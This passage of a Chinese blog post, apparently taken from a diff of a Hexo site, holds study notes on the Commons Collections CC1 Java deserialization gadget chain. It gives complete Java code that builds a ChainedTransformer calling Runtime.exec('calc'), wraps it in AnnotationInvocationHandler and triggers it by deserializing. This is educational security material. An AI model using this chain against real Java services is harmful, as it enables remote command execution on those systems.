class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br><span class="hljs-comment">//        invokerTransformer.transform(runtime);  </span><br>        <span class="hljs-type">HashMap</span>&lt;Object, Object&gt; <span class="hljs-variable">objectObjectHashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        objectObjectHashMap.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <br>        <span class="hljs-type">Map</span>&lt;Object,Object&gt; <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br><span class="hljs-comment">//        Class&lt;? extends Map&gt; aClass = decorate.getClass();  </span><br><span class="hljs-comment">//        Method checkSetValue = aClass.getDeclaredMethod(&quot;checkSetValue&quot;,Object.class);  </span><br><span class="hljs-comment">//        checkSetValue.setAccessible(true);  </span><br><span class="hljs-comment">//        checkSetValue.invoke(decorate,runtime);  </span><br>        <span class="hljs-type">Class</span>&lt;?&gt; <span class="hljs-variable">bClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span>&lt;?&gt; <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> bClass.getDeclaredConstructor(Class.class, Map.class);  <br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(Override.class, objectObjectHashMap);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="通过反射组织调用链"><a href="#通过反射组织调用链" class="headerlink" title="通过反射组织调用链"></a>通过反射组织调用链</h2><p>接下来我们要解决一个问题，Runtime是不能序列化的。<br>我们可以先使用反射的方式实现命令执行</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span>&lt;Runtime&gt; <span class="hljs-variable">runtimeClass</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>exec.invoke(invoke,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure></div>
+<p>然后我们改成使用invoketransformer来实现</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(  <br>        <span class="hljs-string">&quot;getMethod&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;  <br>).transform(Runtime.class);<span class="hljs-comment">//(Runtime.class).getMethod(&quot;getRuntime&quot;) --&gt; method  </span><br>  <br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(  <br>        <span class="hljs-string">&quot;invoke&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;  <br>).transform(o1);<span class="hljs-comment">//o1.invoke(null,null)  --&gt; 相当于创建一个runtime实例  </span><br><span class="hljs-type">Object</span> <span class="hljs-variable">getMethod</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(  <br>        <span class="hljs-string">&quot;getMethod&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;exec&quot;</span>, String.class&#125;  <br>).transform(invoke1);<span class="hljs-comment">//invoke1.getmethod(&quot;exec&quot;,String.class) --&gt;获取到exec这个方法  </span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(  <br>        <span class="hljs-string">&quot;invoke&quot;</span>,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;invoke1, <span class="hljs-string">&quot;calc&quot;</span>&#125;  <br>).transform(getMethod);<span class="hljs-comment">//exec.invoke(invoke1,&quot;calc&quot;)</span><br></code></pre></td></tr></table></figure></div>
+<p>这里逻辑还是挺绕的我们要理解<br>o.transformer(input)–&gt;input.methodname(newobject[])</p>
+<p>换成用chaintransformer表述</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">Transformer[] transformers = new Transformer[]&#123;<br>                // 起点：无视输入，固定返回 Runtime.class<br>                new ConstantTransformer(Runtime.class),<br>                // 第1步：Runtime.class.getMethod(&quot;getRuntime&quot;) → Method<br>                new InvokerTransformer(<br>                        &quot;getMethod&quot;,<br>                        new Class[]&#123;String.class, Class[].class&#125;,<br>                        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;<br>                ),<br>                // 第2步：Method.invoke(null) → Runtime 实例<br>                new InvokerTransformer(<br>                        &quot;invoke&quot;,<br>                        new Class[]&#123;Object.class, Object[].class&#125;,<br>                        new Object[]&#123;null, new Object[0]&#125;<br>                ),<br>                // 第3步：Runtime 实例.exec(&quot;calc&quot;) → 直接执行，不再找 exec<br>                new InvokerTransformer(<br>                        &quot;exec&quot;,<br>                        new Class[]&#123;String.class&#125;,<br>                        new Object[]&#123;&quot;calc&quot;&#125;<br>                )<br>        &#125;;<br>        Transformer chain = new ChainedTransformer(transformers);<br>        // 触发：输入任意值（会被 ConstantTransformer 丢弃）<br>        chain.transform(&quot;随便什么&quot;);<br></code></pre></td></tr></table></figure></div>
+
+<h2 id="构造完整实验代码"><a href="#构造完整实验代码" class="headerlink" title="构造完整实验代码"></a>构造完整实验代码</h2><p>最终得到一个完整的exp</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java">  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 解决了第一个问题  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Transformer</span>[] <span class="hljs-variable">transformers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        <span class="hljs-type">HashMap</span>&lt;Object, Object&gt; <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>        <span class="hljs-type">Map</span>&lt;Object, Object&gt; <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);  <br>  <br>        <span class="hljs-comment">// 序列化反序列化  </span><br>        serialize(o);  <br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>        oos.writeObject(obj);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br>        <span class="hljs-keyword">return</span> obj;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure></div>
+
+<h2 id="断点调试与条件修正"><a href="#断点调试与条件修正" class="headerlink" title="断点调试与条件修正"></a>断点调试与条件修正</h2><p>紧接着我们下断点进行调试</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;  <br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();  <br>    <span class="hljs-type">Class</span>&lt;?&gt; <span class="hljs-variable">memberType</span> <span class="hljs-operator">=</span> memberTypes.get(name);  <br>    <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists  </span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();  <br>        <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||  <br>              value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;  <br>            memberValue.setValue(  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(  <br>                    value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(  <br>                        annotationType.members().get(name)));<br></code></pre></td></tr></table></figure></div>
+<p>我们发现我们还有两个问题需要解决，一是value的值我们希望是chain，而是我们还需要构造通过if判断，一个一个解决这两个问题<br>这里的两个if是第一个注解成员是不是空的，我们用的确实是空的所以直接不通过，所以我们要换一个注解成员不为空的，同时还要通过第二个if，第二个if比较好通过，保证value的类型和它不一致同时不是哪个错误里的就行<br>我们选择了target这个注释<br>就可以通过判断进入setvalue这个我们梦寐以求的代码里了。但是非常不幸的是我们进入之后发现这个value的参数我们没办法控制，这个value是固定的。这时候好像走入死胡同了，接下来将出现神之一手，之前那几个transformer的几个实现类里面有一个是无论什么输入都会转换成固定值，那我们在chain里第一个放上一个，那我们不管它的value是什么到我们这里都可以成为我们想要的值，真实冥冥之中都是写好的，能发现这个漏洞的也是真厉害。</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java">  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 解决了第一个问题  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Step1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Transformer</span>[] <span class="hljs-variable">transformers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        <span class="hljs-type">HashMap</span>&lt;Object, Object&gt; <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;cc&quot;</span>);  <br>        <span class="hljs-type">Map</span>&lt;Object, Object&gt; <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br>  <br>        <span class="hljs-comment">// 序列化反序列化  </span><br>        serialize(o);  <br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>        oos.writeObject(obj);  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Object</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br>        <span class="hljs-keyword">return</span> obj;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure></div>
+<p>伟大无需多言。</p>
+<h2 id="调用链回顾"><a href="#调用链回顾" class="headerlink" title="调用链回顾"></a>调用链回顾</h2><p>接下来我们再梳理一遍这个思路，我们首先发现invoketransformer里面可以任意在执行命令，我们接着找谁可以调用这个transformer方法，我们发现了transformermap里面的checkvalueset，然后 接着往上找我们找到了setvalue，然后这个还被readobject调用，这样我们的反序列化链条就完善了。</p>
+<hr>
+<p><strong>本系列笔记：</strong> <a href="/2026/11/01/java-security-urldns/">Java安全学习</a> · <a href="/2026/11/01/cc1-study-notes/">Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记</a> · <a href="/2026/11/01/cc1-transformedmap/">cc1链学习</a> · <a href="/2026/11/01/cc1-lazymap/">正版cc1链学习</a> · <a href="/2026/11/01/cc3-classloading/">cc3链学习</a> · <a href="/2026/11/01/cc6-study/">cc6链学习</a></p>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Java/">#Java</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CC1/">#CC1</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/11/01/cc1-study-notes/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/11/01/cc1-lazymap/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">正版cc1链学习</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">cc1链学习</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E-Transformer-%E6%8E%A5%E5%8F%A3%E5%85%A5%E6%89%8B"><span class="nav-text">从 Transformer 接口入手</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#InvokerTransformer-%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">InvokerTransformer 与命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE-Transformer-%E7%9A%84%E8%B0%83%E7%94%A8%E4%BD%8D%E7%BD%AE"><span class="nav-text">寻找 Transformer 的调用位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AbstractInputCheckedMapDecorator-%E4%B8%8E-setValue"><span class="nav-text">AbstractInputCheckedMapDecorator 与 setValue</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5-AnnotationInvocationHandler"><span class="nav-text">进入 AnnotationInvocationHandler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E7%BB%84%E7%BB%87%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">通过反射组织调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%AE%8C%E6%95%B4%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="nav-text">构造完整实验代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95%E4%B8%8E%E6%9D%A1%E4%BB%B6%E4%BF%AE%E6%AD%A3"><span class="nav-text">断点调试与条件修正</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%9B%9E%E9%A1%BE"><span class="nav-text">调用链回顾</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">记录探索，保持好奇。</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-mountain-sun"></i>&nbsp;&nbsp;<a href="/">xiaolu-cmd</a>
+            
+        </div>
+        
